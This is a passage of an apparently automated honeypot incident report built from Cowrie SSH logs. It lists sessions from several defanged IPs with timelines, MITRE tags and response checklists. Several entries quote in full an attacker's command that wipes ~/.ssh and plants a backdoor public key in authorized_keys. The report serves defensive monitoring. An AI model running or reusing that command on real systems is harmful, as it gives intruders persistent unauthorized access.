| `2026-04-09 17:45:02` | `cowrie.command.failed` |
| `2026-04-09 17:45:03` | `cowrie.log.closed` |
| `2026-04-09 17:45:03` | `cowrie.session.params` |
| `2026-04-09 17:45:03` | `cowrie.command.input` |
| `2026-04-09 17:45:04` | `cowrie.session.file_download` |
| `2026-04-09 17:45:04` | `cowrie.log.closed` |
| `2026-04-09 17:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-081c3f7a2410

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:45 |
| **Last Seen** | 2026-04-09 17:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:45:08` | `cowrie.session.connect` |
| `2026-04-09 17:45:08` | `cowrie.client.version` |
| `2026-04-09 17:45:09` | `cowrie.client.kex` |
| `2026-04-09 17:45:10` | `cowrie.login.success` |
| `2026-04-09 17:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e5920d2c3b1

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:48 |
| **Last Seen** | 2026-04-09 17:48 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:48:39` | `cowrie.session.connect` |
| `2026-04-09 17:48:39` | `cowrie.client.version` |
| `2026-04-09 17:48:39` | `cowrie.client.kex` |
| `2026-04-09 17:48:41` | `cowrie.login.success` |
| `2026-04-09 17:48:42` | `cowrie.session.params` |
| `2026-04-09 17:48:42` | `cowrie.command.input` |
| `2026-04-09 17:48:42` | `cowrie.command.failed` |
| `2026-04-09 17:48:42` | `cowrie.log.closed` |
| `2026-04-09 17:48:43` | `cowrie.session.params` |
| `2026-04-09 17:48:43` | `cowrie.command.input` |
| `2026-04-09 17:48:43` | `cowrie.session.file_download` |
| `2026-04-09 17:48:43` | `cowrie.log.closed` |
| `2026-04-09 17:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1b6accd4f93

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:48 |
| **Last Seen** | 2026-04-09 17:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:48:48` | `cowrie.session.connect` |
| `2026-04-09 17:48:48` | `cowrie.client.version` |
| `2026-04-09 17:48:48` | `cowrie.client.kex` |
| `2026-04-09 17:48:50` | `cowrie.login.success` |
| `2026-04-09 17:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b7211dd39de

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:52 |
| **Last Seen** | 2026-04-09 17:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:52:19` | `cowrie.session.connect` |
| `2026-04-09 17:52:19` | `cowrie.client.version` |
| `2026-04-09 17:52:20` | `cowrie.client.kex` |
| `2026-04-09 17:52:21` | `cowrie.login.success` |
| `2026-04-09 17:52:22` | `cowrie.session.params` |
| `2026-04-09 17:52:22` | `cowrie.command.input` |
| `2026-04-09 17:52:22` | `cowrie.command.failed` |
| `2026-04-09 17:52:23` | `cowrie.log.closed` |
| `2026-04-09 17:52:24` | `cowrie.session.params` |
| `2026-04-09 17:52:24` | `cowrie.command.input` |
| `2026-04-09 17:52:24` | `cowrie.session.file_download` |
| `2026-04-09 17:52:24` | `cowrie.log.closed` |
| `2026-04-09 17:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf12b54fd61e

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:52 |
| **Last Seen** | 2026-04-09 17:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:52:28` | `cowrie.session.connect` |
| `2026-04-09 17:52:28` | `cowrie.client.version` |
| `2026-04-09 17:52:29` | `cowrie.client.kex` |
| `2026-04-09 17:52:30` | `cowrie.login.success` |
| `2026-04-09 17:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbefd5ef1dc1

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 17:53 |
| **Last Seen** | 2026-04-09 17:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:53:35` | `cowrie.session.connect` |
| `2026-04-09 17:53:35` | `cowrie.client.version` |
| `2026-04-09 17:53:35` | `cowrie.client.kex` |
| `2026-04-09 17:53:36` | `cowrie.login.success` |
| `2026-04-09 17:53:36` | `cowrie.session.params` |
| `2026-04-09 17:53:36` | `cowrie.command.input` |
| `2026-04-09 17:53:36` | `cowrie.command.failed` |
| `2026-04-09 17:53:36` | `cowrie.log.closed` |
| `2026-04-09 17:53:36` | `cowrie.session.params` |
| `2026-04-09 17:53:36` | `cowrie.command.input` |
| `2026-04-09 17:53:37` | `cowrie.session.file_download` |
| `2026-04-09 17:53:37` | `cowrie.log.closed` |
| `2026-04-09 17:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-983239e64cd6

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 17:53 |
| **Last Seen** | 2026-04-09 17:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:53:39` | `cowrie.session.connect` |
| `2026-04-09 17:53:39` | `cowrie.client.version` |
| `2026-04-09 17:53:39` | `cowrie.client.kex` |
| `2026-04-09 17:53:39` | `cowrie.login.success` |
| `2026-04-09 17:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fde2b2c386e

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 17:54 |
| **Last Seen** | 2026-04-09 17:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:54:59` | `cowrie.session.connect` |
| `2026-04-09 17:54:59` | `cowrie.client.version` |
| `2026-04-09 17:55:00` | `cowrie.client.kex` |
| `2026-04-09 17:55:00` | `cowrie.login.success` |
| `2026-04-09 17:55:00` | `cowrie.session.params` |
| `2026-04-09 17:55:00` | `cowrie.command.input` |
| `2026-04-09 17:55:00` | `cowrie.command.failed` |
| `2026-04-09 17:55:01` | `cowrie.log.closed` |
| `2026-04-09 17:55:01` | `cowrie.session.params` |
| `2026-04-09 17:55:01` | `cowrie.command.input` |
| `2026-04-09 17:55:01` | `cowrie.session.file_download` |
| `2026-04-09 17:55:01` | `cowrie.log.closed` |
| `2026-04-09 17:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5052ed3b971

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 17:55 |
| **Last Seen** | 2026-04-09 17:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:55:03` | `cowrie.session.connect` |
| `2026-04-09 17:55:03` | `cowrie.client.version` |
| `2026-04-09 17:55:03` | `cowrie.client.kex` |
| `2026-04-09 17:55:04` | `cowrie.login.success` |
| `2026-04-09 17:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8e552e2fc0e

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:55 |
| **Last Seen** | 2026-04-09 17:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:55:54` | `cowrie.session.connect` |
| `2026-04-09 17:55:54` | `cowrie.client.version` |
| `2026-04-09 17:55:54` | `cowrie.client.kex` |
| `2026-04-09 17:55:56` | `cowrie.login.success` |
| `2026-04-09 17:55:57` | `cowrie.session.params` |
| `2026-04-09 17:55:57` | `cowrie.command.input` |
| `2026-04-09 17:55:57` | `cowrie.command.failed` |
| `2026-04-09 17:55:57` | `cowrie.log.closed` |
| `2026-04-09 17:55:58` | `cowrie.session.params` |
| `2026-04-09 17:55:58` | `cowrie.command.input` |
| `2026-04-09 17:55:58` | `cowrie.session.file_download` |
| `2026-04-09 17:55:58` | `cowrie.log.closed` |
| `2026-04-09 17:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b4ce2290df2

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 17:56 |
| **Last Seen** | 2026-04-09 17:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:56:03` | `cowrie.session.connect` |
| `2026-04-09 17:56:03` | `cowrie.client.version` |
| `2026-04-09 17:56:03` | `cowrie.client.kex` |
| `2026-04-09 17:56:05` | `cowrie.login.success` |
| `2026-04-09 17:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70361f8e8ed6

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 17:56 |
| **Last Seen** | 2026-04-09 17:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:56:26` | `cowrie.session.connect` |
| `2026-04-09 17:56:26` | `cowrie.client.version` |
| `2026-04-09 17:56:26` | `cowrie.client.kex` |
| `2026-04-09 17:56:27` | `cowrie.login.success` |
| `2026-04-09 17:56:27` | `cowrie.session.params` |
| `2026-04-09 17:56:27` | `cowrie.command.input` |
| `2026-04-09 17:56:27` | `cowrie.command.failed` |
| `2026-04-09 17:56:27` | `cowrie.log.closed` |
| `2026-04-09 17:56:28` | `cowrie.session.params` |
| `2026-04-09 17:56:28` | `cowrie.command.input` |
| `2026-04-09 17:56:28` | `cowrie.session.file_download` |
| `2026-04-09 17:56:28` | `cowrie.log.closed` |
| `2026-04-09 17:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31cdebe4fc4a

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 17:56 |
| **Last Seen** | 2026-04-09 17:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:56:30` | `cowrie.session.connect` |
| `2026-04-09 17:56:30` | `cowrie.client.version` |
| `2026-04-09 17:56:30` | `cowrie.client.kex` |
| `2026-04-09 17:56:31` | `cowrie.login.success` |
| `2026-04-09 17:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9185e226cea8

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:57 |
| **Last Seen** | 2026-04-09 17:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:57:20` | `cowrie.session.connect` |
| `2026-04-09 17:57:20` | `cowrie.client.version` |
| `2026-04-09 17:57:21` | `cowrie.client.kex` |
| `2026-04-09 17:57:23` | `cowrie.login.success` |
| `2026-04-09 17:57:24` | `cowrie.session.params` |
| `2026-04-09 17:57:24` | `cowrie.command.input` |
| `2026-04-09 17:57:24` | `cowrie.command.failed` |
| `2026-04-09 17:57:24` | `cowrie.log.closed` |
| `2026-04-09 17:57:25` | `cowrie.session.params` |
| `2026-04-09 17:57:25` | `cowrie.command.input` |
| `2026-04-09 17:57:25` | `cowrie.session.file_download` |
| `2026-04-09 17:57:25` | `cowrie.log.closed` |
| `2026-04-09 17:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2865fdd21fe2

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-09 17:57 |
| **Last Seen** | 2026-04-09 17:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:57:28` | `cowrie.session.connect` |
| `2026-04-09 17:57:28` | `cowrie.client.version` |
| `2026-04-09 17:57:28` | `cowrie.client.kex` |
| `2026-04-09 17:57:28` | `cowrie.login.success` |
| `2026-04-09 17:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6584818dbda9

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 17:57 |
| **Last Seen** | 2026-04-09 17:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:57:48` | `cowrie.session.connect` |
| `2026-04-09 17:57:48` | `cowrie.client.version` |
| `2026-04-09 17:57:48` | `cowrie.client.kex` |
| `2026-04-09 17:57:49` | `cowrie.login.success` |
| `2026-04-09 17:57:49` | `cowrie.session.params` |
| `2026-04-09 17:57:49` | `cowrie.command.input` |
| `2026-04-09 17:57:49` | `cowrie.command.failed` |
| `2026-04-09 17:57:49` | `cowrie.log.closed` |
| `2026-04-09 17:57:49` | `cowrie.session.params` |
| `2026-04-09 17:57:49` | `cowrie.command.input` |
| `2026-04-09 17:57:50` | `cowrie.session.file_download` |
| `2026-04-09 17:57:50` | `cowrie.log.closed` |
| `2026-04-09 17:57:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a15c31dd7a22

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-09 17:57 |
| **Last Seen** | 2026-04-09 17:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 17:57:52` | `cowrie.session.connect` |
| `2026-04-09 17:57:52` | `cowrie.client.version` |
| `2026-04-09 17:57:52` | `cowrie.client.kex` |
| `2026-04-09 17:57:52` | `cowrie.login.success` |
| `2026-04-09 17:57:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

